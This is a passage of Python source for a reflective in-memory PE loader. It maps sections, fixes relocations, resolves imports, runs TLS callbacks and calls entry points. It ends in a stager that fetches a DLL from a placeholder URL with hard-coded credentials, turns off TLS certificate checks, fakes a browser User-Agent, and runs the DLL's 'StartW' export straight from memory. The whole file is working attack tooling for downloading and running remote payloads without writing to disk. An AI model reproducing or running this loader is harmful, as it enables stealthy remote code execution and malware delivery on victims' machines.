		self.pythonmemorymodule.contents.headers = cast(self._headersaddr, PIMAGE_NT_HEADERS)
		self.pythonmemorymodule.contents.headers.contents.OptionalHeader.ImageBase = POINTER_TYPE(self._codebaseaddr)
		self.dbg('Copying sections to reserved memory block.')
		self.copy_sections()

		
		self.dbg('Checking for base relocations.')
		locationDelta = codebase - self.OPTIONAL_HEADER.ImageBase
		if locationDelta != 0:
			self.dbg('Detected relocations - Performing base relocations..')
			self.perform_base_relocations(locationDelta)

		self.dbg('Building import table.')
		self.build_import_table()
		self.dbg('Finalizing sections.')
		self.finalize_sections()
		self.dbg('Executing TLS.')
		self.ExecuteTLS()

		entryaddr = self.pythonmemorymodule.contents.headers.contents.OptionalHeader.AddressOfEntryPoint
		
		self.dbg('Checking for entry point.')
		if entryaddr != 0:
			entryaddr += codebase		 
			
			if self.is_exe():
				ExeEntry = ExeEntryProc(entryaddr)
				if not bool(ExeEntry):
					self.free_library()
					raise WindowsError('exe has no entry point.\n')
				try:
					self.dbg("Calling exe entrypoint 0x%x", entryaddr)
					
					success = ExeEntry(entryaddr)
				except Exception as e:
					print(e)
					
			elif self.is_dll():
				DllEntry = DllEntryProc(entryaddr)
				if not bool(DllEntry):
					self.free_library()
					raise WindowsError('dll has no entry point.\n')
					
				try:
					self.dbg("Calling dll entrypoint 0x%x with DLL_PROCESS_ATTACH", entryaddr)
					success = DllEntry(codebase, DLL_PROCESS_ATTACH, 0)
				except Exception as e:
					print(e)
					
			if not bool(success):
				if self.is_dll():
					self.free_library()
					raise WindowsError('dll could not be loaded.')
				else:
					self.free_exe()
					raise WindowsError('exe could not be loaded')
			self.pythonmemorymodule.contents.initialized = 1

	def IMAGE_FIRST_SECTION(self):
		return self._headersaddr + IMAGE_NT_HEADERS.OptionalHeader.offset + self.FILE_HEADER.SizeOfOptionalHeader
	
	def copy_sections(self):
		codebase = self._codebaseaddr
		sectionaddr = self.IMAGE_FIRST_SECTION()
		numSections = self.pythonmemorymodule.contents.headers.contents.FileHeader.NumberOfSections
		
		for i in range(0, numSections):	
			if self.sections[i].SizeOfRawData == 0:
				size = self.OPTIONAL_HEADER.SectionAlignment
				if size > 0:
					destBaseAddr = codebase + self.sections[i].VirtualAddress
					dest = VirtualAlloc(destBaseAddr, size, MEM_COMMIT, PAGE_READWRITE )
					self.sections[i].Misc_PhysicalAddress = dest 
					memset(dest, 0, size)
				continue
			size = self.sections[i].SizeOfRawData
			dest = VirtualAlloc(codebase + self.sections[i].VirtualAddress, size, MEM_COMMIT, PAGE_READWRITE )
			if dest <=0:
				raise WindowsError('Error copying section no. %s to address: 0x%x',self.sections[i].Name.decode('utf-8'),dest)
			self.sections[i].Misc_PhysicalAddress = dest
			tmpdata = create_unsigned_buffer(size, self.__data__[self.sections[i].PointerToRawData:(self.sections[i].PointerToRawData+size)])
			if not memmove(dest, tmpdata, size):
				raise RuntimeError('memmove failed')
			del tmpdata
			self.dbg('Copied section no. %s to address: 0x%x', self.sections[i].Name.decode('utf-8'), dest)
			i += 1
			

	def ExecuteTLS(self):
		codebase = self._codebaseaddr
		
		directory = self.OPTIONAL_HEADER.DATA_DIRECTORY[IMAGE_DIRECTORY_ENTRY_TLS] 
		if directory.VirtualAddress <= 0: 
			self.dbg("no TLS address found")
			return True
	
		tlsaddr = codebase + directory.VirtualAddress
		tls = IMAGE_TLS_DIRECTORY.from_address(tlsaddr)
		callback = IMAGE_TLS_CALLBACK.from_address(tls.AddressOfCallBacks)
		callbackaddr=tls.AddressOfCallBacks
		
		while(callback):
			TLSexec=TLSexecProc(callback.value)
			tlsres= TLSexec( cast(codebase,LPVOID), DLL_PROCESS_ATTACH, 0)
			if not bool(tlsres):
				raise WindowsError('TLS could not be executed.')
			else:
				# 8 bytes step - this is the size of the callback field in the TLS callbacks table. Need to initialize callback to IMAGE_TLS_CALLBACK with
				# the updated address, otherwise callback.value won't be null when the callback table is finished and the while won't exit
				self.dbg("TLS callback executed")
				callbackaddr+=sizeof(c_ulonglong)
				callback= IMAGE_TLS_CALLBACK.from_address(callbackaddr)				

	def finalize_sections(self):
		sectionaddr = self.IMAGE_FIRST_SECTION()
		numSections = self.pythonmemorymodule.contents.headers.contents.FileHeader.NumberOfSections
		imageOffset = POINTER_TYPE(self.pythonmemorymodule.contents.headers.contents.OptionalHeader.ImageBase & 0xffffffff00000000) if isx64 else POINTER_TYPE(0)
		checkCharacteristic = lambda sect, flag: 1 if (sect.contents.Characteristics & flag) != 0 else 0
		getPhysAddr = lambda sect: section.contents.PhysicalAddress | imageOffset.value
		
		self.dbg("Found %d total sections.",numSections)
		for i in range(0, numSections):
			self.dbg("Section n. %d",i)
			
			section = cast(sectionaddr, PIMAGE_SECTION_HEADER)
			size = section.contents.SizeOfRawData
			if size == 0:
				if checkCharacteristic(section, IMAGE_SCN_CNT_INITIALIZED_DATA):
					self.dbg("Zero size rawdata section")
					size = self.pythonmemorymodule.contents.headers.contents.OptionalHeader.SizeOfInitializedData
				elif checkCharacteristic(section, IMAGE_SCN_CNT_UNINITIALIZED_DATA):
					size = self.pythonmemorymodule.contents.headers.contents.OptionalHeader.SizeOfUninitializedData
					self.dbg("Uninitialized data, return")
					continue
			if size == 0:
				self.dbg("zero size section")
				continue
			self.dbg("size=%d",size)	
			oldProtect = DWORD(0)
			self.dbg("execute %d",checkCharacteristic(section, IMAGE_SCN_MEM_EXECUTE))
			executable = checkCharacteristic(section, IMAGE_SCN_MEM_EXECUTE)
			self.dbg("read %d",checkCharacteristic(section, IMAGE_SCN_MEM_READ))
			readable = checkCharacteristic(section, IMAGE_SCN_MEM_READ)
			writeable = checkCharacteristic(section, IMAGE_SCN_MEM_WRITE)
			self.dbg("write %d",checkCharacteristic(section, IMAGE_SCN_MEM_WRITE))

			if checkCharacteristic(section, IMAGE_SCN_MEM_DISCARDABLE):
				addr = getPhysAddr(section)
				VirtualFree(addr, section.contents.SizeOfRawData, MEM_DECOMMIT)
				continue

			protect = ProtectionFlags[executable][readable][writeable]
			self.dbg("Protection flag:%d",protect)
			if checkCharacteristic(section, IMAGE_SCN_MEM_NOT_CACHED):
				print("not cached")			
				protect |= PAGE_NOCACHE
			

			size = section.contents.SizeOfRawData
			if size == 0:
				if checkCharacteristic(section, IMAGE_SCN_CNT_INITIALIZED_DATA):
					size = self.pythonmemorymodule.contents.headers.contents.OptionalHeader.SizeOfInitializedData
				elif checkCharacteristic(section, IMAGE_SCN_CNT_UNINITIALIZED_DATA):
					size = self.pythonmemorymodule.contents.headers.contents.OptionalHeader.SizeOfUninitializedData
			if size > 0:
				addr = self.sections[i].Misc_PhysicalAddress #getPhysAddr(section)
				self.dbg("physaddr:0x%x", addr)
				if VirtualProtect(addr, size, protect, byref(oldProtect)) == 0:
					raise WindowsError("Error protecting memory page")
			sectionaddr += sizeof(IMAGE_SECTION_HEADER)
			i += 1

	
	def perform_base_relocations(self, delta):
		codeBaseAddr = self._codebaseaddr
		directory = self.OPTIONAL_HEADER.DATA_DIRECTORY[IMAGE_DIRECTORY_ENTRY_BASERELOC]
		if directory.Size <= 0: return
		relocaddr=codeBaseAddr + directory.VirtualAddress
		relocation = IMAGE_BASE_RELOCATION.from_address(relocaddr)
		maxreloc = lambda r: (relocation.SizeOfBlock - IMAGE_SIZEOF_BASE_RELOCATION) / 2

		while relocation.VirtualAddress > 0:
			i = 0
			dest = codeBaseAddr + relocation.VirtualAddress
			relinfoaddr = relocaddr + IMAGE_SIZEOF_BASE_RELOCATION
			while i < maxreloc(relocaddr):
				relinfo = c_ushort.from_address(relinfoaddr)
				type = relinfo.value >> 12
				offset = relinfo.value & 0xfff
				if type == IMAGE_REL_BASED_ABSOLUTE:
					self.dbg("Skipping relocation")
				elif type == IMAGE_REL_BASED_HIGHLOW or (type == IMAGE_REL_BASED_DIR64 and isx64):
					self.dbg("Relocating offset: 0x%x", offset)
					patchAddrHL = cast(dest + offset, LP_POINTER_TYPE)
					patchAddrHL.contents.value += delta
				else:
					self.dbg("Unknown relocation at address: 0x%x", relocation)
					break
				# advancing two bytes at a time in the relocation table
				relinfoaddr += 2
				i += 1
			relocaddr += relocation.SizeOfBlock
			relocation = IMAGE_BASE_RELOCATION.from_address(relocaddr)
	
	
	def build_import_table(self, dlopen = LoadLibraryW):
		codebase = self._codebaseaddr
		self.dbg("codebase:0x%x", codebase)
		directory = self.OPTIONAL_HEADER.DATA_DIRECTORY[IMAGE_DIRECTORY_ENTRY_IMPORT]
		
		if directory.Size <= 0:
			self.dbg('Import directory\'s size appears to be zero or less. Skipping.. (Probably not good)')
			return
		importdescaddr = codebase + directory.VirtualAddress
		check = not bool(IsBadReadPtr(importdescaddr, sizeof(IMAGE_IMPORT_DESCRIPTOR)))
		if not check:
			self.dbg('IsBadReadPtr(address) at address: 0x%x returned true', importdescaddr)
		i=0 # index for entry import struct
		for i in range(0, len(self.DIRECTORY_ENTRY_IMPORT)):
			self.dbg('Found importdesc at address: 0x%x', importdescaddr)
			importdesc = directory.VirtualAddress 
			
			# ref: https://sites.google.com/site/peofcns/win32forth/pe-header-f/02-image_directory/02-import_descriptor
			entry_struct=self.DIRECTORY_ENTRY_IMPORT[i].struct
			entry_imports=self.DIRECTORY_ENTRY_IMPORT[i].imports
			dll = self.DIRECTORY_ENTRY_IMPORT[i].dll.decode('utf-8')
			if not bool(dll):
				self.dbg('Importdesc at address 0x%x name is NULL. Skipping load library', importdescaddr)
				hmod = dll
			else:
				self.dbg('Found imported DLL, %s. Loading..', dll)
				hmod = dlopen(dll)
				if not bool(hmod): raise WindowsError('Failed to load library, %s' % dll)
				result_realloc= realloc(
					self.pythonmemorymodule.contents.modules,
					(self.pythonmemorymodule.contents.modules._b_base_.numModules + 1) * sizeof(HMODULE)
				)
				if not bool(result_realloc):
					raise WindowsError('Failed to allocate additional room for our new import.')
				self.pythonmemorymodule.contents.modules = cast(result_realloc, type(self.pythonmemorymodule.contents.modules))
				self.pythonmemorymodule.contents.modules[self.pythonmemorymodule.contents.modules._b_base_.numModules] = hmod
				self.pythonmemorymodule.contents.modules._b_base_.numModules += 1


			thunkrefaddr = funcrefaddr = codebase + entry_struct.FirstThunk
			if entry_struct.OriginalFirstThunk > 0:
				thunkrefaddr = codebase + entry_struct.OriginalFirstThunk
			
			for j in range(0, len(entry_imports)):
			
				funcref = cast(funcrefaddr, PFARPROC)
				if entry_imports[j].import_by_ordinal == True: 
					if 'decode' in dir(entry_imports[j].ordinal):
						importordinal= entry_imports[j].ordinal.decode('utf-8')
					else:
						importordinal= entry_imports[j].ordinal
					self.dbg('Found import ordinal entry, %s', cast(importordinal, LPCSTR))
					funcref.contents = GetProcAddress(hmod, cast(importordinal, LPCSTR))
					address = funcref.contents
				else:
					importname= entry_imports[j].name.decode('utf-8') 
					self.dbg('Found import by name entry %s , at address 0x%x', importname, entry_imports[j].address)
					address= getprocaddr(hmod, importname.encode())
					if not memmove(funcrefaddr,address.to_bytes(sizeof(LONG_PTR),'little'),sizeof(LONG_PTR)):
						raise WindowsError('memmove failed')
					self.dbg('Resolved import %s at address 0x%x', importname, address)
				if not bool(address):
					raise WindowsError('Could not locate function for thunkref %s', importname)
				funcrefaddr += sizeof(PFARPROC)
				j +=1
			i +=1 
			

	def free_library(self):
		self.dbg("Freeing dll")
		if not bool(self.pythonmemorymodule): return
		pmodule = pointer(self.pythonmemorymodule)
		if self.pythonmemorymodule.contents.initialized != 0:
			DllEntry = DllEntryProc(self.pythonmemorymodule.contents.codeBase + self.pythonmemorymodule.contents.headers.contents.OptionalHeader.AddressOfEntryPoint)
			DllEntry(cast(self.pythonmemorymodule.contents.codeBase, HINSTANCE), DLL_PROCESS_DETACH, 0)
			pmodule.contents.initialized = 0
		if bool(self.pythonmemorymodule.contents.modules) and self.pythonmemorymodule.contents.numModules > 0:
			for i in range(1, self.pythonmemorymodule.contents.numModules):
				if self.pythonmemorymodule.contents.modules[i] != HANDLE(INVALID_HANDLE_VALUE):
					FreeLibrary(self.pythonmemorymodule.contents.modules[i])

		if bool(self._codebaseaddr):
			VirtualFree(self._codebaseaddr, 0, MEM_RELEASE)

		HeapFree(GetProcessHeap(), 0, self.pythonmemorymodule)
		self.close()
		
	def free_exe(self):
		self.dbg("Freeing exe")
		if not bool(self.pythonmemorymodule): return
		pmodule = pointer(self.pythonmemorymodule)
		if bool(self._codebaseaddr):
			VirtualFree(self._codebaseaddr, 0, MEM_RELEASE)

		HeapFree(GetProcessHeap(), 0, self.pythonmemorymodule)
		self.close()

	
	def _proc_addr_by_ordinal(self, idx):
		codebase = self._codebaseaddr
		if idx == -1:
			raise WindowsError('Could not find the function specified')
		elif idx > self._exports_.NumberOfFunctions:
			raise WindowsError('Ordinal number higher than our actual count.')
		funcoffset = DWORD.from_address(codebase + self._exports_.AddressOfFunctions + (idx * 4))
		return funcoffset.value

	
	def _proc_addr_by_name(self, name):
		codebase = self._codebaseaddr
		exports = self._exports_
		if exports.NumberOfNames == 0:
			raise WindowsError('DLL doesn\'t export anything.')

		ordinal = -1
		name = name.lower()
		namerefaddr = codebase + exports.AddressOfNames
		ordinaladdr = codebase + exports.AddressOfNamesOrdinals
		i = 0
		while i < exports.NumberOfNames:
			nameref = DWORD.from_address(namerefaddr)
			funcname = string_at(codebase + nameref.value).lower()
			if funcname.decode() == name:
				ordinal = WORD.from_address(ordinaladdr).value
			i += 1
			namerefaddr += sizeof(DWORD)
			ordinaladdr += sizeof(WORD)
		return self._proc_addr_by_ordinal(ordinal)
	
	def get_proc_addr(self, name_or_ordinal):
		codebase = self._codebaseaddr
		if not hasattr(self, '_exports_'):
			directory = self.OPTIONAL_HEADER.DATA_DIRECTORY[IMAGE_DIRECTORY_ENTRY_EXPORT]
			# No export table found
			if directory.Size <= 0: raise WindowsError('No export table found.')
			self._exports_ = IMAGE_EXPORT_DIRECTORY.from_address(codebase + directory.VirtualAddress)
			if self._exports_.NumberOfFunctions == 0:
				# DLL doesn't export anything
				raise WindowsError('DLL doesn\'t export anything.')
		targ = type(name_or_ordinal)
		if targ in [ str, str, str ]:
			name_or_ordinal = str(name_or_ordinal)
			procaddr_func = self._proc_addr_by_name
		elif targ in [ int, int ]:
			name_or_ordinal = int(name_or_ordinal)
			procaddr_func = self._proc_addr_by_ordinal
		else:
			raise TypeError('Don\'t know what to do with name/ordinal of type: %s!' % targ)

		if not name_or_ordinal in self._foffsets_:
			self._foffsets_[name_or_ordinal] = procaddr_func(name_or_ordinal)
		return FARPROC(codebase + self._foffsets_[name_or_ordinal])

username = "baduser"
password = "badpassword"
download_url = "{{https}}"

# Ignore Certs
context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

req = urllib.request.Request(download_url )
creds = ('%s:%s'% (username, password))
req.add_header('Authorization', 'Basic %s' % base64.b64encode(creds.encode('ascii')).decode('ascii'))
req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36')

result = urllib.request.urlopen( req, context=context ) 
buf = result.read()
dll = MemoryModule(data=buf, debug=False)
startDll = dll.get_proc_addr('StartW')
assert startDll()



